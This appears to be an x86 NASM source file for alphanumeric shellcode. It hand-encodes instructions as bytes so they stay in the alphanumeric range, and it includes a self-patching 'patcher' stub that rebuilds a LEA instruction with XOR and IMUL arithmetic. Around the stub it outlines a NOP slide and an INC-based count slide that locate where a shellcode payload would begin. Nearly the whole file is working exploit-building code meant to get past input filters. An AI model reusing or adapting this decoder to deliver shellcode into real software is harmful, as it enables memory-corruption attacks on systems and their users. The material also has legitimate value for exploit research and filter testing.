BITS 32

; The address operands of instructions can be encoded in various ways.
; Unfortunately, NASM does not always use the alphanumeric variant. Which is why
; these are used:
%define IMUL___ESI__xESPx_(x)    db 0x6B, 0x34, 0x64, x ; IMUL ESI, [ESP], x
%define XOR____ESI__xESPx        db 0x33, 0x34, 0x64    ; XOR  ESI, [ESP]
%define XOR____xESPx__ESI        db 0x31, 0x34, 0x64    ; XOR  [ESP], ESI
%define XOR____xESIxECXx__ESI    db 0x31, 0x34, 0x31    ; XOR  [ESI+ECX], ESI
%define XOR____ESI__xESIxECXx    db 0x33, 0x34, 0x31    ; XOR  ESI, [ESI+ECX]

; ...nopslide goes here...
patcher:
  PUSH   EDX                   ; [ESP0] = base address
  POP    ECX                   ; ECX = base address
  PUSH   0x40404040            ; [ESP0] = code1, ESP = ESP0
  IMUL___ESI__xESPx_(0x30)     ; ESI = code1 * code2
  PUSH   0x40404040            ; [ESP1] = code3, ESP = ESP1
  XOR____ESI__xESPx            ; ESI = (code1 * 30) ^ code2 = (A + D * 3 + P)
  XOR____xESIxECXx__ESI        ; [return address pointer] ^= ESI
  XOR____ESI__xESIxECXx        ; ESI ^= ([return address] ^ ESI) = [return address pointer] = return address = A + D
  PUSH   ESI                   ; [ESP2] = A + D
  POP    ECX                   ; ECX = A + D
  PUSH   0x40404040            ; [ESP3] = code1, ESP = ESP3
  IMUL___ESI__xESPx_(0x30)     ; ESI = code1 * code2
  PUSH   0x40404040            ; [ESP4] = code3, ESP = ESP4
  XOR____ESI__xESPx            ; ESI = (code1 * 30) ^ code2 = (D * 2 + P)
  PUSH   ESI                   ; [ESP5] = (D * 2 + P), ESP = ESP5
  PUSH   ESP                   ; [ESP6] = ESP5, ESP = ESP6
  POP    EAX                   ; EAX = [ESP6] = ESP5
  XOR    [EAX], EDI            ; [ESP5] = (D * 2 + P) ^ EDI
  XOR    EDI, [EAX]            ; EDI ^= (D * 2 + P) ^ EDI = (D * 2 + P)
; 8D 54 0F 04 -> LEA EDX, [ECX+EDI+4] => 0x040F548D
; 0x040F548D ^ 0x42424242 == 464D16CF
; 0x464D16CF == 0x4D4D3738 * 0x30 ^ 0x38374C4F
  PUSH   0x4D4D3738            ; [ESP3] = code1, ESP = ESP3
  IMUL___ESI__xESPx_(0x30)     ; ESI = code1 * code2
  PUSH   0x38374C4F            ; [ESP4] = code3, ESP = ESP4
  XOR____ESI__xESPx            ; ESI = (code1 * 30) ^ code2 = (D * 2 + P)
  XOR    [ECX+EDI], ESI        ; [A + D * 3 + P] = LEA EDX, [ECX+EDI+4]
; ...count slide goes here...
;   INC EDX
;   INC EDX
;   INC EDX
;   ...
; ...at address (A + D * 3 + P):
;   LEA EDX, [ECX+EDI+4]       ; EDX = A + D * 3 + P + 4
; ...count slide continues at A + D * 3 + P + 5...
;   INC EDX                    ; ECX = A + D * 3 + P + 5
;   INC EDX                    ; ECX = A + D * 3 + P + 6
;   ...
;   INC EDX                    ; EDX = A + D * 3 + P + 1 + (D - O)
; EDX now points to the base address of shellcode:
shellcode:



